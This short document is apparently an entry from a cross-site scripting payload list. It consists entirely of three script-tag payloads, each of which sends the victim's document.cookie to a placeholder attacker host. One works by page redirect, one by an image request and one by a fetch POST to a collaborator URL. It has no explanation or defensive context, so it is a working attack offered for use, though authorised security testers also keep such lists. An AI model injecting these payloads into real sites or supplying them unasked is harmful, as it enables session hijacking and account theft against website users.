<script>document.location='http://{ATTACKER_URL}/grabber.php?c='+document.cookie</script>
<script>new Image().src="http://{ATTACKER_URL}/cookie.php?c="+document.cookie;</script>
<script>fetch('https://{COLLABORATOR_URL}', {method: 'POST', mode: 'no-cors', body: document.cookie})</script>
